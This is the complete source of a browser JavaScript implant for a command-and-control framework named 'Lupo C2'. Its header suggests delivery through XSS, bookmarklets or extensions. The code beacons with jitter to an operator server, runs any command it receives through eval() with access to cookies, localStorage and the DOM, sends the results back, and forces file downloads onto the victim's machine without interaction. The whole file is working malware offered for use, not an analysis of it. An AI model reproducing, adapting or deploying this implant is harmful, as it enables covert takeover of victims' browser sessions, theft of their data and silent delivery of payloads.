/**
 * lupo_implant_browser.js
 * Lupo C2 — Browser-Side JavaScript Implant (HTTP/HTTPS)
 *
 * Delivery: inject via XSS, <script src="...">, Service Worker, bookmarklet,
 *           browser extension, or any other client-side execution vector.
 *
 * Protocol:  HTTP/HTTPS GET requests — identical to the standard Lupo HTTPS
 *            implant.  All parameters are URL-encoded query strings.
 *            Server responds with JSON: {"cmd":"...","user":"..."}
 *
 * Execution: Instead of shell commands, received "cmd" strings are evaluated
 *            with eval() in the page's JavaScript context, giving access to
 *            the DOM, cookies, localStorage, fetch(), etc.
 *
 * Download:  The "upload" command (server → client) forces a browser file
 *            download by injecting a temporary <a download> element and
 *            clicking it — no user interaction required.
 *
 * Note:      Reading local filesystem files is not possible from a browser
 *            context, so the "download" command (client → server) is omitted.
 *
 * Cross-origin:  The Lupo HTTP listener includes Access-Control-Allow-Origin: *
 *                so this implant works whether injected into a third-party page
 *                or served same-origin.  HTTP and HTTPS are both supported via
 *                the C2_PROTOCOL config variable.
 */

(function () {
  "use strict";

  /* ── Configuration ──────────────────────────────────────────────────────── */

  var C2_PROTOCOL = "http://";         // "http://" or "https://"
  var C2_HOST     = "127.0.0.1";   // C2 IP or hostname
  var C2_PORT     = 9001;
  var PSK         = "wolfpack";
  var BEACON_MS   = 5000;             // base beacon interval (ms)
  var JITTER_MS   = 7000;              // random jitter added per beacon (ms)

  /* Architecture tag sent to server so the operator can identify the target */
  var ARCH = "browser/" + (navigator.userAgent || "unknown");

  /* ── In-memory session state (never persisted to disk) ──────────────────── */

  var sessionID  = -1;   // -1 = not yet registered
  var uuid       = "";
  var beaconMs   = BEACON_MS;
  var pendingData = "";  // output from previous eval, sent on next beacon

  /* ── Helpers ────────────────────────────────────────────────────────────── */

  function c2Base() {
    return C2_PROTOCOL + C2_HOST + ":" + C2_PORT;
  }

  function jittered() {
    return beaconMs + Math.floor(Math.random() * JITTER_MS);
  }

  /* ── Command dispatch ───────────────────────────────────────────────────── */

  /**
   * Dispatch a server-issued command string.
   *
   * Supported commands:
   *   eval <js>          — evaluate arbitrary JS; capture return value + errors
   *   ping               — respond with "pong"
   *   exit               — stop the beacon loop
   *   upload <name> <b64>— force a file download to the user's machine
   *   updateinterval <n> — change beacon interval (seconds)
   *
   * Any unrecognised command is passed directly to eval() as a convenience.
   */
  function dispatch(cmdStr) {
    if (!cmdStr) return;

    var parts = cmdStr.match(/^\S+/) ? cmdStr.split(/\s+/) : [];
    if (parts.length === 0) return;

    var cmd  = parts[0];
    var args = parts.slice(1);

    if (cmd === "exit") {
      stop();
      return;
    }

    if (cmd === "ping") {
      pendingData = "pong";
      return;
    }

    if (cmd === "updateinterval" && args.length >= 1) {
      var n = parseInt(args[0], 10);
      if (n > 0) {
        beaconMs = n * 1000;
        pendingData = "Implant interval updated to: " + n;
      } else {
        pendingData = "updateinterval: invalid value";
      }
      return;
    }

    if (cmd === "upload" && args.length >= 2) {
      /* upload <filename> <base64_content>
       * Decodes the base64 payload and forces a browser file download. */
      var filename = args[0];
      var b64      = args.slice(1).join("");
      try {
        var binary = atob(b64);
        var bytes  = new Uint8Array(binary.length);
        for (var i = 0; i < binary.length; i++) {
          bytes[i] = binary.charCodeAt(i);
        }
        var blob = new Blob([bytes], { type: "application/octet-stream" });
        var url  = URL.createObjectURL(blob);
        var a    = document.createElement("a");
        a.href     = url;
        a.download = filename;
        a.style.display = "none";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        pendingData = "File downloaded by browser: " + filename;
      } catch (e) {
        pendingData = "upload error: " + e.message;
      }
      return;
    }

    /* Default: eval the entire command string as JavaScript.
     * "eval <code>" strips the leading "eval " prefix; bare JS runs as-is. */
    var code = (cmd === "eval") ? args.join(" ") : cmdStr;
    try {
      /* eslint-disable no-eval */
      var result = eval(code); // jshint ignore:line
      /* eslint-enable no-eval */
      pendingData = (result !== undefined) ? String(result) : "";
    } catch (e) {
      pendingData = "eval error: " + e.message;
    }
  }

  /* ── Beacon loop ────────────────────────────────────────────────────────── */

  var _timer = null;

  function stop() {
    if (_timer !== null) {
      clearTimeout(_timer);
      _timer = null;
    }
  }

  function schedule() {
    _timer = setTimeout(beacon, jittered());
  }

  function beacon() {
    if (sessionID < 0) {
      register();
    } else {
      checkin();
    }
  }

  /* ── Registration ──────────────────────────────────────────────────────── */

  function register() {
    var url = c2Base() + "/?psk=" + encodeURIComponent(PSK)
            + "&register=true"
            + "&arch="   + encodeURIComponent(ARCH)
            + "&update=" + Math.round(beaconMs / 1000);

    fetch(url)
      .then(function (r) { return r.json(); })
      .then(function (data) {
        var sid = data.sessionID;
        var id  = data.UUID;
        /* CRITICAL: server counter starts at 0 — must accept >= 0, NOT > 0 */
        if (typeof sid === "number" && sid >= 0 && id) {
          sessionID = sid;
          uuid      = id;
        }
        schedule();
      })
      .catch(function () {
        /* Connection failed — retry after jittered interval */
        schedule();
      });
  }

  /* ── Check-in ────────────────────────────────────────────────────────────── */

  function checkin() {
    var data = pendingData;
    pendingData = "";   /* clear before send so failures don't resend stale data */

    var url = c2Base() + "/?psk="       + encodeURIComponent(PSK)
            + "&sessionID=" + sessionID
            + "&UUID="      + encodeURIComponent(uuid)
            + "&data="      + encodeURIComponent(data)
            + "&arch="      + encodeURIComponent(ARCH)
            + "&update="    + Math.round(beaconMs / 1000)
            + "&register=false";

    fetch(url)
      .then(function (r) { return r.json(); })
      .then(function (resp) {
        /* Re-registration: server issued new credentials */
        if (typeof resp.sessionID === "number") {
          var sid = resp.sessionID;
          var id  = resp.UUID;
          if (sid >= 0 && id) {
            sessionID = sid;
            uuid      = id;
          }
          schedule();
          return;
        }

        /* Normal command response */
        var cmd = (resp.cmd !== undefined) ? String(resp.cmd) : "";
        if (cmd) {
          dispatch(cmd);
        }
        schedule();
      })
      .catch(function () {
        /* Network error — put data back so it is resent next beacon */
        if (data) pendingData = data;
        schedule();
      });
  }

  /* ── Start ───────────────────────────────────────────────────────────────── */

  schedule();

}());
